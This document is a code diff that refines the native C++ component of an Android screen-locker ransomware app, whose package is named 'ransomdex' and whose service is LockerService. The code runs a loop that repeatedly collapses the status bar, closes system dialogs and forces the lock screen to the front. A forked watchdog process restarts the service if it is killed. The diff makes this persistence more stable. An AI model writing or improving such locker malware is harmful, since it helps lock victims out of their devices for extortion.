@@ -3,25 +3,29 @@
 #include <unistd.h>
 #include <pthread.h>
 #include <sys/types.h>
+#include <cstdio>
 #include <signal.h>
 
 JavaVM* jvm = nullptr;
 jobject serviceObject = nullptr;
+pid_t watchdogPid = -1;
 bool isRunning = false;
 
 void* aggressiveLoop(void* args) {
     JNIEnv* env;
     if (jvm->AttachCurrentThread(&env, nullptr) != JNI_OK) return nullptr;
 
-    jclass clazz = env->GetObjectClass(serviceObject);
-    jmethodID collapseMethod = env->GetMethodID(clazz, "collapseStatusBar", "()V");
-    jmethodID closeDialogsMethod = env->GetMethodID(clazz, "closeSystemDialogs", "()V");
-    jmethodID forceFrontMethod = env->GetMethodID(clazz, "forceFront", "()V");
-
     int uiCounter = 0;
     int forceCounter = 0;
 
     while (isRunning) {
+        if (serviceObject == nullptr) break;
+
+        jclass clazz = env->GetObjectClass(serviceObject);
+        jmethodID collapseMethod = env->GetMethodID(clazz, "collapseStatusBar", "()V");
+        jmethodID closeDialogsMethod = env->GetMethodID(clazz, "closeSystemDialogs", "()V");
+        jmethodID forceFrontMethod = env->GetMethodID(clazz, "forceFront", "()V");
+
         // Panggil penutup UI sistem setiap 10ms (Stabil & Tanpa Glitch)
         if (++uiCounter >= 10) {
             env->CallVoidMethod(serviceObject, collapseMethod);
@@ -43,8 +47,8 @@ void* aggressiveLoop(void* args) {
 }
 
 void startWatchdog(const char* cmd) {
-    pid_t pid = fork();
-    if (pid == 0) { // Proses anak (Watchdog)
+    watchdogPid = fork();
+    if (watchdogPid == 0) { // Proses anak (Watchdog)
         pid_t ppid = getppid();
         while (true) {
             if (kill(ppid, 0) == -1) { // Jika parent (Java) mati
@@ -61,12 +65,12 @@ Java_com_bondex_ransomdex_LockerService_startNativeAggression(JNIEnv* env, jobje
     if (isRunning) return;
     
     env->GetJavaVM(&jvm);
-    serviceObject = env->NewGlobalRef(thiz);
     isRunning = true;
+    serviceObject = env->NewGlobalRef(thiz);
 
     const char* cmdStr = env->GetStringUTFChars(serviceName, nullptr);
-    char fullCmd[256];
-    sprintf(fullCmd, "am startservice --user 0 -n %s", cmdStr);
+    char fullCmd[512];
+    snprintf(fullCmd, sizeof(fullCmd), "am startservice --user 0 -n %s", cmdStr);
     
     startWatchdog(fullCmd);
     env->ReleaseStringUTFChars(serviceName, cmdStr);
@@ -78,6 +82,10 @@ Java_com_bondex_ransomdex_LockerService_startNativeAggression(JNIEnv* env, jobje
 extern "C" JNIEXPORT void JNICALL
 Java_com_bondex_ransomdex_LockerService_stopNativeAggression(JNIEnv* env, jobject thiz) {
     isRunning = false;
+    if (watchdogPid != -1) {
+        kill(watchdogPid, SIGKILL); // Hentikan watchdog agar tidak restart service
+        watchdogPid = -1;
+    }
     if (serviceObject != nullptr) {
         env->DeleteGlobalRef(serviceObject);
         serviceObject = nullptr;
